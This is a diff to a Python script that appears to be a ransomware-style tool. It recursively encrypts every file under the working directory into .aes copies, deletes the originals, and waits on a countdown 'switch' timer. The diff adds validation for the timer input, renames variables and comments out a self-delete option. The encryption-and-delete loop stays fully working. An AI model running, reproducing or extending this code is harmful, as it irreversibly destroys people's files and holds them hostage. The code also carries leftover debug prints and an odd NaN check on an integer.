@@ -7,7 +7,7 @@ import glob
 import os
 from os import remove
 from sys import argv  #for self delete
-
+import math
 
 #-----------------------------#
 #Note on structure of combined file: First the key generation is placed at the top so that the person can start the count
@@ -15,9 +15,10 @@ from sys import argv  #for self delete
 #All of the definitions for encryption are placed at the top, and only the recursive selection and encryption itself are
 #placed last.
 
-clock=0            #define variables early so that I set up an error handling loop
-self_destruct=0
 
+#define variables early so that I set up an error handling loop
+self_destruct=0
+clock= -1   #this needs to be set at <0 for the error handling loop lower down to work
 
 currentdirectory = os.getcwd()   # Get current directory (don't want to encrypt system files)
 
@@ -50,8 +51,16 @@ while True:    #infinite loop used to control errors from input
         break
     except ValueError:
         print("please type 'y' or 'n'")
-
-clock = input("\n How many seconds until switch is triggered? : ")
+print(type(clock))
+while True:
+    try:
+        while clock <= 0 and not math.isnan(clock): 
+            print(type(clock))         
+            clock = int(input("\n How many seconds until switch is triggered? : "))  #input returns to line 57 before continuing, so the clock=int(input) is important so that the comparison on line 57 works
+        break
+    except ValueError:
+        print("please enter a number greater than 0")
+        
 
 trigger = int(clock)
 
@@ -91,28 +100,28 @@ print("Beginning recursive encryption..")
 for x in glob.glob(currentdirectory +'/**/*/*', recursive=True):    # Main loop to encrypt all files recursively
 # double asterix ** tells program to encrypt all types of files
 
-    fullpath = os.path.join(currentdirectory, x)
-    fullnewf = os.path.join(currentdirectory, x + '.aes')
+    filepath = os.path.join(currentdirectory, x)
+    newfile = os.path.join(currentdirectory, x + '.aes')
     # Encrypt
-    if os.path.isfile(fullpath):   #make sure it is a file, otherwise if it is folder it will give error
-        print('>>> Located: \t' + fullpath + '')
-        print('>>> Encrypted: \t' + fullnewf + '\n')
-        with open(fullpath, "rb") as file:      #rb= "read in binary"
+    if os.path.isfile(filepath):   #make sure it is a file, otherwise if it is folder it will give error
+        print('>>> Located: \t' + filepath + '')
+        print('>>> Encrypted: \t' + newfile + '\n')
+        with open(filepath, "rb") as file:      #rb= "read in binary"
             file_data = file.read()
        
-        encrypted_data = f.encrypt(file_data)  # encrypt data
+        encrypted_data = f.encrypt(file_data)  
 
-        with open(fullnewf, "wb") as file:  # wb = "write in binary"
+        with open(newfile, "wb") as file:  # wb = "write in binary"
             file.write(encrypted_data)
         
-        os.remove(fullpath)  #removes the old file
+        os.remove(filepath)  #removes the old file
 
 
 print('\n Encryption complete...\n\n')
 
-if self_destruct == "y":          #-------------------------------------------------
-    remove(argv[0])              #comment these to make self-destruct not possible 
-elif self_destruct == "n":      #-------------------------------------------------
-    quit()
+#if self_destruct == "y":          #-------------------------------------------------
+    #remove(argv[0])              #comment these to make self-destruct not possible 
+#elif self_destruct == "n":      #-------------------------------------------------
+    #quit()
 
 
